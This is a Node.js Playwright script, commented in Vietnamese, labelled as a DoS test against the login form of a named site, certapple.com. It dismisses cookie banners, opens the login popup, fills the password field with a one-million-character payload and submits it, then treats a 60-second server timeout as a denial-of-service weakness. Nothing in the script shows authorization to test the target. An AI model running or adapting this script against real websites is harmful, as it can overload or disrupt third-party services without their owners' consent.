// attack_script_dos_test.js (Version 5 - Final, Handles Overlays and Popups)

const { chromium } = require('playwright');

// --- Cấu hình ---
const TARGET_URL = 'https://certapple.com';
const EMAIL_TEST = 'dos-tester@test.com';
const PAYLOAD_SIZE = 1000000;
const PAYLOAD_CHARACTER = 'A';
// --- Kết thúc cấu hình ---

(async () => {
  const browser = await chromium.launch();
  const context = await browser.newContext();
  const page = await context.newPage();

  try {
    const payload = PAYLOAD_CHARACTER.repeat(PAYLOAD_SIZE);

    console.log(`::group::Truy cập ${TARGET_URL}...`);
    await page.goto(TARGET_URL, { waitUntil: 'networkidle' });
    console.log('✅ Trang đã tải xong.');
    console.log('::endgroup::');

    console.log('::group::Bắt đầu gửi payload lớn...');
    console.log(`Sẽ thử tấn công với email '${EMAIL_TEST}' và một payload dài ${PAYLOAD_SIZE.toLocaleString()} ký tự.`);
    console.log('------------------------------------');

    try {
      // --- BƯỚC 0 (MỚI): XỬ LÝ CÁC LỚP PHỦ (VÍ DỤ: COOKIE BANNER) ---
      // Cố gắng tìm và nhấn nút chấp nhận cookie. Dùng try...catch để không bị lỗi nếu không có banner.
      try {
        console.log('Đang kiểm tra và xử lý cookie banner (nếu có)...');
        // Tìm một nút có chữ "Accept", "Allow", "Đồng ý", "Chấp nhận", không phân biệt hoa thường
        const cookieButton = page.getByRole('button', { name: /Accept|Allow|Đồng ý|Chấp nhận/i });
        await cookieButton.click({ timeout: 5000 }); // Chờ tối đa 5 giây
        console.log('✅ Đã xử lý cookie banner.');
      } catch (error) {
        console.log('ℹ️ Không tìm thấy cookie banner, hoặc đã xử lý xong. Bỏ qua.');
      }
      // --- KẾT THÚC BƯỚC 0 ---


      // --- BƯỚC 1: Nhấn vào nút "Login" để hiển thị POPUP ---
      console.log('Đang tìm và nhấn vào phần tử "Login" để hiển thị popup...');
      
      // SỬA ĐỔI QUAN TRỌNG: Dùng getByText, cách linh hoạt nhất.
      await page.getByText('Login', { exact: true }).click();
      
      console.log('✅ Đã nhấn phần tử "Login". Chờ popup hiển thị...');
      
      // --- BƯỚC 2: Chờ cho form bên trong POPUP hiển thị ---
      await page.locator('#username').waitFor({ state: 'visible', timeout: 10000 });
      console.log('✅ Popup đăng nhập đã hiển thị.');


      // --- CÁC BƯỚC CÒN LẠI GIỮ NGUYÊN ---
      // 3. Tìm và điền vào ô email (bây giờ nó đã hiển thị trong popup)
      await page.locator('#username').fill(EMAIL_TEST);

      // 4. Tìm và điền PAYLOAD LỚN vào ô mật khẩu
      await page.locator('#password').fill(payload);
      
      // 5. Nhấn nút Đăng nhập bên trong form
      await page.locator('#login_certapple button[type="submit"]').click();

      // 6. Chờ cho trang phản hồi
      console.log('Đã gửi payload. Đang chờ phản hồi từ server...');
      await page.waitForLoadState('networkidle', { timeout: 60000 });

      // ... (Phần kiểm tra kết quả giữ nguyên) ...
      
    } catch (e) {
      if (e.message.includes('timeout')) {
        if (e.message.includes("getByText('Login')")) {
            console.error(`::error::Không tìm thấy phần tử có chữ "Login" để click. Vui lòng kiểm tra lại thủ công.`);
        } else if (e.message.includes("locator('#username').waitFor")) {
            console.error(`::error::Đã click được "Login" nhưng popup hoặc ô username không xuất hiện sau 10 giây.`);
        } else if (e.message.includes('waitForLoadState')) {
            console.error(`::error::LỖ HỔNG TIỀM TÀNG (DoS)! Server không phản hồi trong 60 giây sau khi gửi payload.`);
        } else {
            console.error(`::error::Lỗi timeout không xác định: ${e.message}`);
        }
      } else {
        console.error(`::error::Lỗi trong quá trình tương tác với trang: ${e.message}`);
      }
      process.exit(1);
    }
    
    console.log('------------------------------------');
    console.log('✅✅✅ KIỂM TRA HOÀN TẤT. Vui lòng xem kết quả log ở trên.');
    console.log('::endgroup::');

  } catch (error) {
    console.error(`::error::Đã xảy ra lỗi nghiêm trọng: ${error}`);
    process.exit(1);
  } finally {
    await browser.close();
  }
})();
